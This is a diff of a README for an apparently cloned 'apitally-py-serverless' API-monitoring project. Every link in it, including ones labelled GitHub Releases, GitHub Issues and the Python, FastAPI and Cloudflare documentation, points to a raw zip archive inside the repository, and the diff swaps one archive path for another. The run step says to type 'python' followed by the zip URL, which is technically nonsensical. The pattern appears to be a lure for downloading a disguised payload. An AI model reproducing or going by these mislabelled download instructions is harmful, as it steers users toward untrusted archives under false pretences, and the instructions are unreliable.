@@ -1,6 +1,6 @@
 # 🌟 apitally-py-serverless - Effortless API Monitoring and Analytics
 
-[![Download](https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip%20release-blue)](https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip)
+[![Download](https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip%20release-blue)](https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **apitally-py-serverless**, your go-to solution for monitoring and an
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip).
+To get started, visit this page to download: [GitHub Releases](https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip).
 
 1. Click on the latest release.
 2. Choose the appropriate file for your operating system.
@@ -34,7 +34,7 @@ After successful installation, follow these steps to run the application:
    - Use the `cd` command followed by the path to your downloaded folder.
    - Example: `cd path/to/downloaded/folder`
 4. **Run the Application**:
-   - Type `python https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip` and press Enter.
+   - Type `python https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip` and press Enter.
    - This command will start the application.
 
 You will see a message confirming that the application is running.
@@ -61,16 +61,16 @@ If you encounter issues while running the application, consider the following:
 
 If you have questions or need help, you can join our community:
 
-- Explore discussions on [GitHub Issues](https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip).
+- Explore discussions on [GitHub Issues](https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip).
 - Connect with other users via our social media channels.
 
 ## 🔗 Additional Resources
 
 For further learning, check these resources:
 
-- [Python Official Documentation](https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip)
-- [FastAPI Documentation](https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip)
-- [Cloudflare Workers Documentation](https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip)
+- [Python Official Documentation](https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip)
+- [FastAPI Documentation](https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip)
+- [Cloudflare Workers Documentation](https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip)
 
 ## 📈 Contributing
 
@@ -80,4 +80,4 @@ We welcome contributions to **apitally-py-serverless**. If you want to help impr
 
 This project is licensed under the MIT License. You can use, modify, and distribute the software as long as you include the original license.
 
-Thank you for using **apitally-py-serverless**! Enjoy effortless monitoring and analytics for your APIs. For any more information, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Myothantzin-Programming/apitally-py-serverless/main/apitally_serverless/py_serverless_apitally_3.4-alpha.1.zip).
+Thank you for using **apitally-py-serverless**! Enjoy effortless monitoring and analytics for your APIs. For any more information, visit this page to download: [GitHub Releases](https://github.com/Myothantzin-Programming/apitally-py-serverless/raw/refs/heads/main/apitally_serverless/common/apitally-serverless-py-3.6.zip).
